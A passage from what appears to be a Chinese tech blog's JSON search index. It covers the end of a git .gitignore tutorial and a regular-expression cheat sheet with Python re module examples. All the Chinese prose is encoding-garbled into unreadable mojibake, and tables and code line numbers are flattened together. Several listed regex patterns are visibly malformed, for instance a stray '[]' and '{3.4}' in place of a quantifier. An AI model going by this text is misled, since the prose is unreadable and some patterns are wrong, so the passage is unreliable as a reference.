# Windows: Thumbs.db ehthumbs.db Desktop.ini # Python: *.py[cod] *.so *.egg *.egg-info dist build # My configurations: db.ini deploy_key_rsa   æœ€åä¸€æ­¥å°±æ˜¯æŠŠ.gitignoreä¹Ÿæäº¤åˆ°Gitï¼Œå°±å®Œæˆäº†ï¼å½“ç„¶æ£€éªŒ.gitignoreçš„æ ‡å‡†æ˜¯git statuså‘½ä»¤æ˜¯ä¸æ˜¯è¯´working directory cleanã€‚\nä½¿ç”¨Windowsçš„ç«¥é‹æ³¨æ„äº†ï¼Œå¦‚æœä½ åœ¨èµ„æºç®¡ç†å™¨é‡Œæ–°å»ºä¸€ä¸ª.gitignoreæ–‡ä»¶ï¼Œå®ƒä¼šéå¸¸å¼±æ™ºåœ°æç¤ºä½ å¿…é¡»è¾“å…¥æ–‡ä»¶åï¼Œä½†æ˜¯åœ¨æ–‡æœ¬ç¼–è¾‘å™¨é‡Œâ€œä¿å­˜â€æˆ–è€…â€œå¦å­˜ä¸ºâ€å°±å¯ä»¥æŠŠæ–‡ä»¶ä¿å­˜ä¸º.gitignoreäº†ã€‚\næœ‰äº›æ—¶å€™ï¼Œä½ æƒ³æ·»åŠ ä¸€ä¸ªæ–‡ä»¶åˆ°Gitï¼Œä½†å‘ç°æ·»åŠ ä¸äº†ï¼ŒåŸå› æ˜¯è¿™ä¸ªæ–‡ä»¶è¢«.gitignoreå¿½ç•¥äº†ï¼š\n$ git add App.class The following paths are ignored by one of your .gitignore files: App.class Use -f if you really want to add them. å¦‚æœä½ ç¡®å®æƒ³æ·»åŠ è¯¥æ–‡ä»¶ï¼Œå¯ä»¥ç”¨-få¼ºåˆ¶æ·»åŠ åˆ°Gitï¼š\n$ git add -f App.class æˆ–è€…ä½ å‘ç°ï¼Œå¯èƒ½æ˜¯.gitignoreå†™å¾—æœ‰é—®é¢˜ï¼Œéœ€è¦æ‰¾å‡ºæ¥åˆ°åº•å“ªä¸ªè§„åˆ™å†™é”™äº†ï¼Œå¯ä»¥ç”¨git check-ignoreå‘½ä»¤æ£€æŸ¥ï¼š\n$ git check-ignore -v App.class .gitignore:3:*.class\tApp.class Gitä¼šå‘Šè¯‰æˆ‘ä»¬ï¼Œ.gitignoreçš„ç¬¬3è¡Œè§„åˆ™å¿½ç•¥äº†è¯¥æ–‡ä»¶ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¯ä»¥çŸ¥é“åº”è¯¥ä¿®è®¢å“ªä¸ªè§„åˆ™ã€‚\n åç»­ï¼šæ­å»ºgitæœåŠ¡å™¨  ","description":"","tags":["git"],"title":"git","uri":"/posts/git/"},{"categories":["tech"],"content":"æ­£åˆ™è¡¨è¾¾å¼çš„è§„åˆ™ å¸¸ç”¨å…ƒå­—ç¬¦\n   ä»£ç  è¯´æ˜     . åŒ¹é…é™¤æ¢è¡Œç¬¦ä»¥å¤–çš„ä»»æ„å­—ç¬¦   \\w åŒ¹é…å­—æ¯æˆ–æ•°å­—æˆ–ä¸‹åˆ’çº¿   \\s åŒ¹é…ä»»æ„çš„ç©ºç™½ç¬¦   \\d åŒ¹é…æ•°å­—   \\b åŒ¹é…å•è¯çš„å¼€å§‹æˆ–ç»“æŸ   ^ åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å§‹   $ åŒ¹é…å­—ç¬¦ä¸²çš„ç»“æŸ    å¸¸ç”¨é™å®šç¬¦\n   ä»£ç /è¯­æ³• è¯´æ˜     * é‡å¤é›¶æ¬¡æˆ–æ›´å¤šæ¬¡   + é‡å¤ä¸€æ¬¡æˆ–æ›´å¤šæ¬¡   ? é‡å¤é›¶æ¬¡æˆ–ä¸€æ¬¡   {n} é‡å¤næ¬¡   {n,} é‡å¤næ¬¡æˆ–æ›´å¤šæ¬¡   {n,m} é‡å¤nåˆ°mæ¬¡    å¸¸ç”¨åä¹‰è¯\n   ä»£ç /è¯­æ³• è¯´æ˜     \\W åŒ¹é…ä»»æ„ä¸æ˜¯å­—æ¯ï¼Œæ•°å­—ï¼Œä¸‹åˆ’çº¿ï¼Œæ±‰å­—çš„å­—ç¬¦   \\S åŒ¹é…ä»»æ„ä¸æ˜¯ç©ºç™½ç¬¦çš„å­—ç¬¦   \\D åŒ¹é…ä»»æ„éæ•°å­—çš„å­—ç¬¦   \\B åŒ¹é…ä¸æ˜¯å•è¯å¼€å¤´æˆ–ç»“æŸçš„ä½ç½®   [^x] åŒ¹é…é™¤äº†xä»¥å¤–çš„ä»»æ„å­—ç¬¦   [^aeiou] åŒ¹é…é™¤äº†aeiouè¿™å‡ ä¸ªå­—æ¯ä»¥å¤–çš„ä»»æ„å­—ç¬¦    é¢„å®šä¹‰å­—ç¬¦é›†è¡¨\n   \\d \\dåŒ¹é…ä»»ä½•åè¿›åˆ¶æ•°ï¼Œå®ƒç›¸å½“äºç±»[0-9]ï¼Œ\\d+å¦‚æœéœ€è¦åŒ¹é…ä¸€ä½æˆ–è€…å¤šä½æ•°çš„æ•°å­—æ—¶ç”¨     \\D \\DåŒ¹é…ä»»ä½•éæ•°å­—å­—ç¬¦ï¼Œå®ƒç›¸å½“äºç±»[^0-9]   \\s \\såŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ï¼Œå®ƒç›¸å½“äºç±»[\\t\\n\\r\\f\\v]   \\S \\SåŒ¹é…ä»»ä½•éç©ºç™½å­—ç¬¦ï¼Œå®ƒç›¸å½“äºç±»[^\\t\\n\\r\\f\\v]   \\w \\wåŒ¹é…åŒ…æ‹¬ä¸‹åˆ’çº¿åœ¨å†…ä»»ä½•å­—æ¯æ•°å­—å­—ç¬¦ï¼Œå®ƒç›¸å½“äºç±» {a-z,A-Z,0-9,_}   \\W \\WåŒ¹é…éä»»ä½•å­—æ¯æ•°å­—å­—ç¬¦åŒ…æ‹¬ä¸‹åˆ’çº¿åœ¨å†…ï¼Œå®ƒç›¸å½“äºç±» { ^a-z,A-Z,0-9,_}   \\A ä»…åŒ¹é…å­—ç¬¦ä¸²å¼€å¤´,åŒ^   \\Z ä»…åŒ¹é…å­—ç¬¦ä¸²ç»“å°¾ï¼ŒåŒ$   \\b båŒ¹é…ä¸€ä¸ªå•è¯è¾¹ç•Œï¼Œä¹Ÿå°±æ˜¯æŒ‡å•è¯å’Œç©ºæ ¼é—´çš„ä½ç½®   \\B [^\\b]    å¸¸ç”¨æ­£åˆ™è¡¨è¾¾å¼  å¼•ç”¨ï¼šå²ä¸Šæœ€å…¨å¸¸ç”¨æ­£åˆ™è¡¨è¾¾å¼å¤§å…¨\n ä¸€ã€æ ¡éªŒæ•°å­—çš„è¡¨è¾¾å¼   æ•°å­—ï¼š^[0-9]*$\n  nä½çš„æ•°å­—ï¼š^\\d{n}$\n  è‡³å°‘nä½çš„æ•°å­—ï¼š^\\d{n,}$\n  m-nä½çš„æ•°å­—ï¼š^\\d{m,n}$\n  é›¶å’Œéé›¶å¼€å¤´çš„æ•°å­—ï¼š^(0|[1-9][0-9]*)$\n  éé›¶å¼€å¤´çš„æœ€å¤šå¸¦ä¸¤ä½å°æ•°çš„æ•°å­—ï¼š^([1-9][0-9]*)+(.[0-9]{1,2})?$\n  å¸¦1-2ä½å°æ•°çš„æ­£æ•°æˆ–è´Ÿæ•°ï¼š^(\\-)?\\d+(\\.\\d{1,2})?$\n  æ­£æ•°ã€è´Ÿæ•°ã€å’Œå°æ•°ï¼š^(\\-|\\+)?\\d+(\\.\\d+)?$\n  æœ‰ä¸¤ä½å°æ•°çš„æ­£å®æ•°ï¼š^[0-9]+(.[0-9]{2})?$\n  æœ‰1~3ä½å°æ•°çš„æ­£å®æ•°ï¼š^[0-9]+(.[0-9]{1,3})?$\n  éé›¶çš„æ­£æ•´æ•°ï¼š^[1-9]\\d*$ æˆ– ^([1-9][0-9]*){1,3}$ æˆ– ^\\+?[1-9][0-9]*$\n  éé›¶çš„è´Ÿæ•´æ•°ï¼š^\\-[1-9][]0-9\"*$ æˆ– ^-[1-9]\\d*$\n  éè´Ÿæ•´æ•°ï¼š^\\d+$ æˆ– ^[1-9]\\d*|0$\n  éæ­£æ•´æ•°ï¼š^-[1-9]\\d*|0$ æˆ– ^((-\\d+)|(0+))$\n  éè´Ÿæµ®ç‚¹æ•°ï¼š^\\d+(\\.\\d+)?$ æˆ– ^[1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*|0?\\.0+|0$\n  éæ­£æµ®ç‚¹æ•°ï¼š^((-\\d+(\\.\\d+)?)|(0+(\\.0+)?))$ æˆ– ^(-([1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*))|0?\\.0+|0$\n  æ­£æµ®ç‚¹æ•°ï¼š^[1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*$ æˆ– ^(([0-9]+\\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\\.[0-9]+)|([0-9]*[1-9][0-9]*))$\n  è´Ÿæµ®ç‚¹æ•°ï¼š^-([1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*)$ æˆ– ^(-(([0-9]+\\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\\.[0-9]+)|([0-9]*[1-9][0-9]*)))$\n  æµ®ç‚¹æ•°ï¼š^(-?\\d+)(\\.\\d+)?$ æˆ– ^-?([1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*|0?\\.0+|0)$\n  äºŒã€æ ¡éªŒå­—ç¬¦çš„è¡¨è¾¾å¼   æ±‰å­—ï¼š^[\\u4e00-\\u9fa5]{0,}$\n  è‹±æ–‡å’Œæ•°å­—ï¼š^[A-Za-z0-9]+$ æˆ– ^[A-Za-z0-9]{4,40}$\n  é•¿åº¦ä¸º3-20çš„æ‰€æœ‰å­—ç¬¦ï¼š^.{3,20}$\n  ç”±26ä¸ªè‹±æ–‡å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²ï¼š^[A-Za-z]+$\n  ç”±26ä¸ªå¤§å†™è‹±æ–‡å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²ï¼š^[A-Z]+$\n  ç”±26ä¸ªå°å†™è‹±æ–‡å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²ï¼š^[a-z]+$\n  ç”±æ•°å­—å’Œ26ä¸ªè‹±æ–‡å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²ï¼š^[A-Za-z0-9]+$\n  ç”±æ•°å­—ã€26ä¸ªè‹±æ–‡å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿ç»„æˆçš„å­—ç¬¦ä¸²ï¼š^\\w+$ æˆ– ^\\w{3,20}$\n  ä¸­æ–‡ã€è‹±æ–‡ã€æ•°å­—åŒ…æ‹¬ä¸‹åˆ’çº¿ï¼š^[\\u4E00-\\u9FA5A-Za-z0-9_]+$\n  ä¸­æ–‡ã€è‹±æ–‡ã€æ•°å­—ä½†ä¸åŒ…æ‹¬ä¸‹åˆ’çº¿ç­‰ç¬¦å·ï¼š^[\\u4E00-\\u9FA5A-Za-z0-9]+$ æˆ–  ^[\\u4E00-\\u9FA5A-Za-z0-9]{2,20}$\n  å¯ä»¥è¾“å…¥å«æœ‰^%\u0026',;=?$\"ç­‰å­—ç¬¦ï¼š[^%\u0026',;=?$\\x22]+ 12\n  ç¦æ­¢è¾“å…¥å«æœ‰~çš„å­—ç¬¦ï¼š[^~\\x22]+\n  ä¸‰ã€ç‰¹æ®Šéœ€æ±‚è¡¨è¾¾å¼   Emailåœ°å€ï¼š^\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)*$\n  åŸŸåï¼š[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(/.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+/.?\n  InternetURLï¼š[a-zA-z]+://[^\\s]* æˆ– ^http://([\\w-]+\\.)+[\\w-]+(/[\\w-./?%\u0026=]*)?$\n  æ‰‹æœºå·ç ï¼š^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\\d{8}$\n  ç”µè¯å·ç (\"XXX-XXXXXXX\"ã€\"XXXX-XXXXXXXX\"ã€\"XXX-XXXXXXX\"ã€\"XXX-XXXXXXXX\"ã€\"XXXXXXX\"å’Œ\"XXXXXXXX)ï¼š^(\\(\\d{3,4}-)|\\d{3.4}-)?\\d{7,8}$\n  å›½å†…ç”µè¯å·ç (0511-4405222ã€021-87888822)ï¼š\\d{3}-\\d{8}|\\d{4}-\\d{7}\n  èº«ä»½è¯å·(15ä½ã€18ä½æ•°å­—)ï¼š^\\d{15}|\\d{18}$\n  çŸ­èº«ä»½è¯å·ç (æ•°å­—ã€å­—æ¯xç»“å°¾)ï¼š^([0-9]){7,18}(x|X)?$ æˆ– ^\\d{8,18}|[0-9x]{8,18}|[0-9X]{8,18}?$\n  å¸å·æ˜¯å¦åˆæ³•(å­—æ¯å¼€å¤´ï¼Œå…è®¸5-16å­—èŠ‚ï¼Œå…è®¸å­—æ¯æ•°å­—ä¸‹åˆ’çº¿)ï¼š^[a-zA-Z][a-zA-Z0-9_]{4,15}$\n  å¯†ç (ä»¥å­—æ¯å¼€å¤´ï¼Œé•¿åº¦åœ¨6~18ä¹‹é—´ï¼Œåªèƒ½åŒ…å«å­—æ¯ã€æ•°å­—å’Œä¸‹åˆ’çº¿)ï¼š^[a-zA-Z]\\w{5,17}$\n  å¼ºå¯†ç (å¿…é¡»åŒ…å«å¤§å°å†™å­—æ¯å’Œæ•°å­—çš„ç»„åˆï¼Œä¸èƒ½ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦ï¼Œé•¿åº¦åœ¨8-10ä¹‹é—´)ï¼š ^(?=.*\\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$\n  æ—¥æœŸæ ¼å¼ï¼š^\\d{4}-\\d{1,2}-\\d{1,2}\n  ä¸€å¹´çš„12ä¸ªæœˆ(01ï½09å’Œ1ï½12)ï¼š^(0?[1-9]|1[0-2])$\n  ä¸€ä¸ªæœˆçš„31å¤©(01ï½09å’Œ1ï½31)ï¼š^((0?[1-9])|((1|2)[0-9])|30|31)$\n  é’±çš„è¾“å…¥æ ¼å¼ï¼š\n  æœ‰å››ç§é’±çš„è¡¨ç¤ºå½¢å¼æˆ‘ä»¬å¯ä»¥æ¥å—:\"10000.00\" å’Œ \"10,000.00\", å’Œæ²¡æœ‰ \"åˆ†\" çš„ \"10000\" å’Œ \"10,000\"ï¼š^[1-9][0-9]*$\nè¿™è¡¨ç¤ºä»»æ„ä¸€ä¸ªä¸ä»¥0å¼€å¤´çš„æ•°å­—,ä½†æ˜¯,è¿™ä¹Ÿæ„å‘³ç€ä¸€ä¸ªå­—ç¬¦\"0\"ä¸é€šè¿‡,æ‰€ä»¥æˆ‘ä»¬é‡‡ç”¨ä¸‹é¢çš„å½¢å¼ï¼š^(0|[1-9][0-9]*)$\nä¸€ä¸ª0æˆ–è€…ä¸€ä¸ªä¸ä»¥0å¼€å¤´çš„æ•°å­—.æˆ‘ä»¬è¿˜å¯ä»¥å…è®¸å¼€å¤´æœ‰ä¸€ä¸ªè´Ÿå·ï¼š^(0|-?[1-9][0-9]*)$\nè¿™è¡¨ç¤ºä¸€ä¸ª0æˆ–è€…ä¸€ä¸ªå¯èƒ½ä¸ºè´Ÿçš„å¼€å¤´ä¸ä¸º0çš„æ•°å­—.è®©ç”¨æˆ·ä»¥0å¼€å¤´å¥½äº†.æŠŠè´Ÿå·çš„ä¹Ÿå»æ‰,å› ä¸ºé’±æ€»ä¸èƒ½æ˜¯è´Ÿçš„å§.ä¸‹é¢æˆ‘ä»¬è¦åŠ çš„æ˜¯è¯´æ˜å¯èƒ½çš„å°æ•°éƒ¨åˆ†ï¼š^[0-9]+(.[0-9]+)?$\nå¿…é¡»è¯´æ˜çš„æ˜¯,å°æ•°ç‚¹åé¢è‡³å°‘åº”è¯¥æœ‰1ä½æ•°,æ‰€ä»¥\"10.\"æ˜¯ä¸é€šè¿‡çš„,ä½†æ˜¯ \"10\" å’Œ \"10.2\" æ˜¯é€šè¿‡çš„ï¼š^[0-9]+(.[0-9]{2})?$\nè¿™æ ·æˆ‘ä»¬è§„å®šå°æ•°ç‚¹åé¢å¿…é¡»æœ‰ä¸¤ä½,å¦‚æœä½ è®¤ä¸ºå¤ªè‹›åˆ»äº†,å¯ä»¥è¿™æ ·ï¼š^[0-9]+(.[0-9]{1,2})?$\nè¿™æ ·å°±å…è®¸ç”¨æˆ·åªå†™ä¸€ä½å°æ•°.ä¸‹é¢æˆ‘ä»¬è¯¥è€ƒè™‘æ•°å­—ä¸­çš„é€—å·äº†,æˆ‘ä»¬å¯ä»¥è¿™æ ·ï¼š ^[0-9]{1,3}(,[0-9]{3})*(.[0-9]{1,2})?$\nåˆ°3ä¸ªæ•°å­—,åé¢è·Ÿç€ä»»æ„ä¸ª é€—å·+3ä¸ªæ•°å­—,é€—å·æˆä¸ºå¯é€‰,è€Œä¸æ˜¯å¿…é¡»ï¼š ^([0-9]+|[0-9]{1,3}(,[0-9]{3})*)(.[0-9]{1,2})?$\nå¤‡æ³¨ï¼šè¿™å°±æ˜¯æœ€ç»ˆç»“æœäº†,åˆ«å¿˜äº†\"+\"å¯ä»¥ç”¨\"*\"æ›¿ä»£å¦‚æœä½ è§‰å¾—ç©ºå­—ç¬¦ä¸²ä¹Ÿå¯ä»¥æ¥å—çš„è¯(å¥‡æ€ª,ä¸ºä»€ä¹ˆ?)æœ€å,åˆ«å¿˜äº†åœ¨ç”¨å‡½æ•°æ—¶å»æ‰å»æ‰é‚£ä¸ªåæ–œæ ,ä¸€èˆ¬çš„é”™è¯¯éƒ½åœ¨è¿™é‡Œ\n xmlæ–‡ä»¶ï¼š^([a-zA-Z]+-?)+[a-zA-Z0-9]+\\\\.[x|X][m|M][l|L]$\n  ä¸­æ–‡å­—ç¬¦çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š[\\u4e00-\\u9fa5]\n  åŒå­—èŠ‚å­—ç¬¦ï¼š[^\\x00-\\xff] (åŒ…æ‹¬æ±‰å­—åœ¨å†…ï¼Œå¯ä»¥ç”¨æ¥è®¡ç®—å­—ç¬¦ä¸²çš„é•¿åº¦(ä¸€ä¸ªåŒå­—èŠ‚å­—ç¬¦é•¿åº¦è®¡2ï¼ŒASCIIå­—ç¬¦è®¡1))\n  ç©ºç™½è¡Œçš„æ­£åˆ™è¡¨è¾¾å¼ï¼š\\n\\s*\\r (å¯ä»¥ç”¨æ¥åˆ é™¤ç©ºç™½è¡Œ)*\n  HTMLæ ‡è®°çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š\u003c(\\S*?)[^\u003e]*\u003e.*?\u003c/\\1\u003e|\u003c.*? /\u003e (ç½‘ä¸Šæµä¼ çš„ç‰ˆæœ¬å¤ªç³Ÿç³•ï¼Œä¸Šé¢è¿™ä¸ªä¹Ÿä»…ä»…èƒ½éƒ¨åˆ†ï¼Œå¯¹äºå¤æ‚çš„åµŒå¥—æ ‡è®°ä¾æ—§æ— èƒ½ä¸ºåŠ›)\n  é¦–å°¾ç©ºç™½å­—ç¬¦çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š ^\\s*|\\s*$æˆ– (^\\s*)|(\\s*$) (å¯ä»¥ç”¨æ¥åˆ é™¤è¡Œé¦–è¡Œå°¾çš„ç©ºç™½å­—ç¬¦(åŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰)ï¼Œéå¸¸æœ‰ç”¨çš„è¡¨è¾¾å¼)\n  è…¾è®¯QQå·ï¼š[1-9][0-9]{4,} (è…¾è®¯QQå·ä»10000å¼€å§‹)\n  ä¸­å›½é‚®æ”¿ç¼–ç ï¼š[1-9]\\d{5}(?!\\d) (ä¸­å›½é‚®æ”¿ç¼–ç ä¸º6ä½æ•°å­—)\n  IPåœ°å€ï¼š\\d+\\.\\d+\\.\\d+\\.\\d+ (æå–IPåœ°å€æ—¶æœ‰ç”¨)\n  IPåœ°å€ï¼š((?:(?:25[0-5]|2[0-4]\\\\d|[01]?\\\\d?\\\\d)\\\\.){3}(?:25[0-5]|2[0-4]\\\\d|[01]?\\\\d?\\\\d))\n  Python reæ¨¡å— äººç”Ÿè‹¦çŸ­ï¼Œä¸å¦‚Pythonã€‚\n å¼•ç”¨ï¼špythonåŸºç¡€â€”reæ¨¡å—â€”æ­£åˆ™è¡¨è¾¾å¼\n pythonä»1.5ç‰ˆæœ¬èµ·å¢åŠ reæ¨¡å—ä¸ºè‡ªå¸¦çš„æ¨¡å—ï¼Œæä¾›äº†Perlé£æ ¼çš„æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼\nä»¥ä¸‹æ˜¯python reåº“çš„å¸¸ç”¨å‡½æ•°\n   å‡½æ•° æè¿°     compile(pattern[, flags]) æ ¹æ®åŒ…å«æ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²åˆ›å»ºæ¨¡å¼å¯¹è±¡   search(pattern, string[, flags]) åœ¨å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾æ¨¡å¼   match(pattern, string[, flags]) åœ¨å­—ç¬¦ä¸²å¼€å¤´åŒ¹é…æ¨¡å¼   split(pattern, string[, maxsplit=0]) æ ¹æ®æ¨¡å¼æ¥åˆ†å‰²å­—ç¬¦ä¸²   findall(pattern, string) è¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼Œå…¶ä¸­åŒ…å«å­—ç¬¦ä¸²ä¸­æ‰€æœ‰ä¸æ¨¡å¼åŒ¹é…çš„å­ä¸²   sub(pat, repl, string[, count=0]) å°†å­—ç¬¦ä¸²ä¸­ä¸æ¨¡å¼patåŒ¹é…çš„å­ä¸²éƒ½æ›¿æ¢ä¸ºrepl   escape(string) å¯¹å­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„æ­£åˆ™è¡¨è¾¾å¼ç‰¹æ®Šå­—ç¬¦éƒ½è¿›è¡Œè½¬ä¹‰      re.compile()   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76  compile å‡½æ•°ç”¨äºç¼–è¯‘æ­£åˆ™è¡¨è¾¾å¼ï¼Œç”Ÿæˆä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼ˆ Pattern ï¼‰å¯¹è±¡ï¼Œä¾› match() å’Œ search() è¿™ä¸¤ä¸ªå‡½æ•°ä½¿ç”¨ã€‚ è¯­æ³•æ ¼å¼ä¸ºï¼š re.compile(pattern[, flags]) å®ä¾‹ \u003e\u003e\u003eimport re \u003e\u003e\u003e pattern = re.compile(r'\\d+') # ç”¨äºåŒ¹é…è‡³å°‘ä¸€ä¸ªæ•°å­— \u003e\u003e\u003e m = pattern.match('one12twothree34four') # æŸ¥æ‰¾å¤´éƒ¨ï¼Œæ²¡æœ‰åŒ¹é… \u003e\u003e\u003e print(m) None \u003e\u003e\u003e m = pattern.match('one12twothree34four', 2, 10) # ä»'e'çš„ä½ç½®å¼€å§‹åŒ¹é…ï¼Œæ²¡æœ‰åŒ¹é… \u003e\u003e\u003e print(m) None \u003e\u003e\u003e m = pattern.match('one12twothree34four', 3, 10) # ä»'1'çš„ä½ç½®å¼€å§‹åŒ¹é…ï¼Œæ­£å¥½åŒ¹é… \u003e\u003e\u003e print(m) # è¿”å›ä¸€ä¸ª Match å¯¹è±¡ \u003c_sre.SRE_Match object at 0x10a42aac0\u003e \u003e\u003e\u003e m.group(0) # å¯çœç•¥ 0 '12' \u003e\u003e\u003e m.start(0) # å¯çœç•¥ 0 3 \u003e\u003e\u003e m.end(0) # å¯çœç•¥ 0 5 \u003e\u003e\u003e m.span(0) # å¯çœç•¥ 0 (3, 5) åœ¨ä¸Šé¢ï¼Œå½“åŒ¹é…æˆåŠŸæ—¶è¿”å›ä¸€ä¸ª Match å¯¹è±¡ï¼Œå…¶ä¸­ï¼š group([group1, â€¦])Â æ–¹æ³•ç”¨äºè·å¾—ä¸€ä¸ªæˆ–å¤šä¸ªåˆ†ç»„åŒ¹é…çš„å­—ç¬¦ä¸²ï¼Œå½“è¦è·å¾—æ•´ä¸ªåŒ¹é…çš„å­ä¸²æ—¶ï¼Œå¯ç›´æ¥ä½¿ç”¨Â group()Â æˆ–Â group(0)ï¼› start([group])Â æ–¹æ³•ç”¨äºè·å–åˆ†ç»„åŒ¹é…çš„å­ä¸²åœ¨æ•´ä¸ªå­—ç¬¦ä¸²ä¸­çš„èµ·å§‹ä½ç½®ï¼ˆå­ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ç´¢å¼•ï¼‰ï¼Œå‚æ•°é»˜è®¤å€¼ä¸º 0ï¼› end([group])Â æ–¹æ³•ç”¨äºè·å–åˆ†ç»„åŒ¹é…çš„å­ä¸²åœ¨æ•´ä¸ªå­—ç¬¦ä¸²ä¸­çš„ç»“æŸä½ç½®ï¼ˆå­ä¸²æœ€åä¸€ä¸ªå­—ç¬¦çš„ç´¢å¼•+1ï¼‰ï¼Œå‚æ•°é»˜è®¤å€¼ä¸º 0ï¼› span([group])Â æ–¹æ³•è¿”å›Â (start(group), end(group))ã€‚ å†çœ‹çœ‹ä¸€ä¸ªä¾‹å­ï¼š å®ä¾‹ \u003e\u003e\u003eimport re \u003e\u003e\u003e pattern = re.compile(r'([a-z]+) ([a-z]+)', re.I) # re.I è¡¨ç¤ºå¿½ç•¥å¤§å°å†™ \u003e\u003e\u003e m = pattern.match('Hello World Wide Web') \u003e\u003e\u003e print(m)# åŒ¹é…æˆåŠŸï¼Œè¿”å›ä¸€ä¸ª Match å¯¹è±¡ \u003c_sre.SRE_Match object at 0x10bea83e8\u003e \u003e\u003e\u003e m.group(0) # è¿”å›åŒ¹é…æˆåŠŸçš„æ•´ä¸ªå­ä¸² 'Hello World' \u003e\u003e\u003e m.span(0) # è¿”å›åŒ¹é…æˆåŠŸçš„æ•´ä¸ªå­ä¸²çš„ç´¢å¼• (0, 11) \u003e\u003e\u003e m.group(1) # è¿”å›ç¬¬ä¸€ä¸ªåˆ†ç»„åŒ¹é…æˆåŠŸçš„å­ä¸² 'Hello' \u003e\u003e\u003e m.span(1) # è¿”å›ç¬¬ä¸€ä¸ªåˆ†ç»„åŒ¹é…æˆåŠŸçš„å­ä¸²çš„ç´¢å¼• (0, 5) \u003e\u003e\u003e m.group(2) # è¿”å›ç¬¬äºŒä¸ªåˆ†ç»„åŒ¹é…æˆåŠŸçš„å­ä¸² 'World' \u003e\u003e\u003e m.span(2) # è¿”å›ç¬¬äºŒä¸ªåˆ†ç»„åŒ¹é…æˆåŠŸçš„å­ä¸² (6, 11) \u003e\u003e\u003e m.groups() # ç­‰ä»·äº (m.group(1), m.group(2), ...) ('Hello', 'World') \u003e\u003e\u003e m.group(3) # ä¸å­˜åœ¨ç¬¬ä¸‰ä¸ªåˆ†ç»„ Traceback (most recent call last): File \"\u003cstdin\u003e\", line 1, in \u003cmodule\u003e IndexError: no such group     re.search()\u0026re.match()   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118  re.search æ‰«ææ•´ä¸ªå­—ç¬¦ä¸²å¹¶è¿”å›ç¬¬ä¸€ä¸ªæˆåŠŸçš„åŒ¹é…ã€‚ å‡½æ•°è¯­æ³•ï¼š re.search(pattern, string, flags=0) å‡½æ•°å‚æ•°è¯´æ˜ï¼š pattern:åŒ¹é…çš„æ­£åˆ™è¡¨è¾¾å¼ string:è¦åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚ flags:æ ‡å¿—ä½ï¼Œç”¨äºæ§åˆ¶æ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…æ–¹å¼ï¼Œå¦‚ï¼šæ˜¯å¦åŒºåˆ†å¤§å°å†™ï¼Œå¤šè¡ŒåŒ¹é…ç­‰ç­‰ã€‚ åŒ¹é…æˆåŠŸre.searchæ–¹æ³•è¿”å›ä¸€ä¸ªåŒ¹é…çš„å¯¹è±¡ï¼Œå¦åˆ™è¿”å›Noneã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨group(num) æˆ– groups() åŒ¹é…å¯¹è±¡å‡½æ•°æ¥è·å–åŒ¹é…è¡¨è¾¾å¼ã€‚ åŒ¹é…å¯¹è±¡æ–¹æ³• group(num=0):åŒ¹é…çš„æ•´ä¸ªè¡¨è¾¾å¼çš„å­—ç¬¦ä¸²ï¼Œgroup() å¯ä»¥ä¸€æ¬¡è¾“å…¥å¤šä¸ªç»„å·ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹å®ƒå°†è¿”å›ä¸€ä¸ªåŒ…å«é‚£äº›ç»„æ‰€å¯¹åº”å€¼çš„å…ƒç»„ã€‚ groups():è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å°ç»„å­—ç¬¦ä¸²çš„å…ƒç»„ï¼Œä» 1 åˆ° æ‰€å«çš„å°ç»„å·ã€‚ å®ä¾‹ import re line = \"Cats are smarter than dogs\"; searchObj = re.search( r'(.*) are (.*?) .*', line, re.M|re.I) if searchObj: print (\"searchObj.group() : \", searchObj.group()) print (\"searchObj.group(1) : \", 